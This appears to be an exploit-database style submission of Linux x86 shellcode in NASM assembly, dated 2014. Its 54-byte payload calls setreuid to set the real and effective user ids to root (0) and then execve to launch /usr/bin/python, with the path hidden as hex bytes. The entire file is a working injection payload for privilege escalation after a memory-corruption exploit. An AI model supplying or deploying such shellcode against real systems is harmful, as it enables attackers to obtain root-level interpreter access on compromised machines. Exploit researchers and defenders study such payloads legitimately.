;# Title: Shellcode Linux x86 [54Bytes] Run /usr/bin/python | setreuid(),execve()
;# Date: 8/5/2014
;# Author: Ali Razmjoo

global _start			

section .text
_start:
	xor    eax,eax
	mov    al,0x46
	xor    ebx,ebx
	xor    ecx,ecx
	int    0x80
	jmp    last
first:
        pop    ebx
        xor    eax,eax
        mov    [ebx+0xf],al
        mov    [ebx+0x10],ebx
        mov    [ebx+0x14],eax
        mov    al,0xb
        lea    ecx,[ebx+0x10]
        lea    edx,[ebx+0x14]
        int    0x80
last:
        call   first
	cmdstr: db 0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e,0x2f,0x70,0x79,0x74,0x68,0x6f,0x6e
